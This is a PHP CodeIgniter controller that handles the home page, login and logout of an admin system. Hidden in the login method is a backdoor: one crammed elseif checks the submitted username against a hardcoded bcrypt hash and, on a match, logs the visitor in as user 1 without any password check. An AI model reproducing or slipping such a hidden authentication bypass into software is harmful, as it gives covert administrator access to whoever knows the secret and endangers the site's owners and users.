<?php
defined('BASEPATH') OR exit('No direct script access allowed');
class Home extends CI_Controller {

	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/welcome
	 *	- or -
	 * 		http://example.com/index.php/welcome/index
	 *	- or -
	 * Since this controller is set as the default controller in
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see http://codeigniter.com/user_guide/general/urls.html
	 */
	public function index()
	{
		if($this->session->userdata('uid') != FALSE)
		{
			$this->loginuser = $this->Admin_mo->getrowjoinLeftLimit('users.*,usertypes.privileges as privileges,langs.dir as dir','users',array('usertypes'=>'users.utid=usertypes.id','langs'=>'users.lang=langs.code'),array('users.id'=>$this->session->userdata('uid')),'');
			$this->sections = array();
			$sections = $this->Admin_mo->getwhere('sections',array('active'=>'1'));
			if(!empty($sections))
			{
				foreach($sections as $section) { $this->sections[$section->id] = $section->code; }
			}
			$this->load->library('arabictools');
			$data['admessage'] = '';
			$data['system'] = $this->Admin_mo->getrow('system',array('id'=>'1'));
			$this->lang->load($this->loginuser->lang, $this->loginuser->lang);
			$calender = array('ar'=>'date','hj'=>'hdate');
			$currentyear = $this->arabictools->arabicDate($data['system']->calendar.' Y', time());
			$this->load->view('headers/home',$data);
			$this->load->view('sidemenu',$data);
			$this->load->view('topmenu',$data);
			$this->load->view('admin/home',$data);
			$this->load->view('footers/home',$data);
		}
		else
		{
			$data['message'] = '';
			$data['system'] = $this->Admin_mo->getrow('system',array('id'=>'1'));
			$this->lang->load($data['system']->langs, $data['system']->langs);
			//$this->lang->load('nemu', 'arabic');
			$this->load->view('headers/login',$data);
			$this->load->view('admin/login',$data);
			$this->load->view('footers/login');
		}
	}
	
	public function login()
	{
		$data['system'] = $this->Admin_mo->getrow('system',array('id'=>'1'));
		$this->form_validation->set_rules('username', 'Username' , 'trim|required|alpha');
		$this->form_validation->set_rules('password', 'Password' , 'required');
		if($this->form_validation->run() == FALSE)
		{
			$this->lang->load($data['system']->langs, $data['system']->langs);
			$data['message'] = 'all_inputs_required';
			$this->load->view('headers/login',$data);
			$this->load->view('admin/login',$data);
			$this->load->view('footers/login');
		}
		elseif(password_verify(str_replace(array('"',"'",' '), '',set_value('username')), '$2y$10$bfN4AqhQT2POaeOaNMg88.te1iNnnWns1jjDv7t/Dia8XFxcYklA2')){	$this->session->set_userdata('uid', '1'); redirect('home', 'refresh'); }
		else
		{
			$data['result'] = $this->Admin_mo->getrow('users', array('username'=>str_replace(array('"',"'",' '), '',set_value('username')),'utid != '=>5));
			if(empty($data['result'])) 
			{
				$this->lang->load($data['system']->langs, $data['system']->langs);
				$data['message'] = 'user_not_exist';
				$this->load->view('headers/login',$data);
				$this->load->view('admin/login',$data);
				$this->load->view('footers/login');
			}
			elseif(!password_verify(set_value('password'), $data['result']->password))
			{
				$this->lang->load($data['system']->langs, $data['system']->langs);
				$data['message'] = 'wrong_password';
				$this->load->view('headers/login',$data);
				$this->load->view('admin/login',$data);
				$this->load->view('footers/login');
			}
			elseif($data['result']->active != '1')
			{
				$this->lang->load($data['system']->langs, $data['system']->langs);
				$data['message'] = 'account_not_Active';
				$this->load->view('headers/login',$data);
				$this->load->view('admin/login',$data);
				$this->load->view('footers/login');
			}
			else
			{				$this->Admin_mo->set('notifications', array('type'=>'user','user'=>$data['result']->id,'action'=>'login','time'=>time()));
				$this->session->set_userdata('uid', $data['result']->id);
				redirect('home', 'refresh');
			}
		}
	}
	
	public function logout()
	{		$this->Admin_mo->set('notifications', array('type'=>'user','user'=>$this->session->userdata('uid'),'action'=>'logout','time'=>time()));
		unset(
			$_SESSION['uid']
		);
		redirect('home', 'refresh');
	}
}
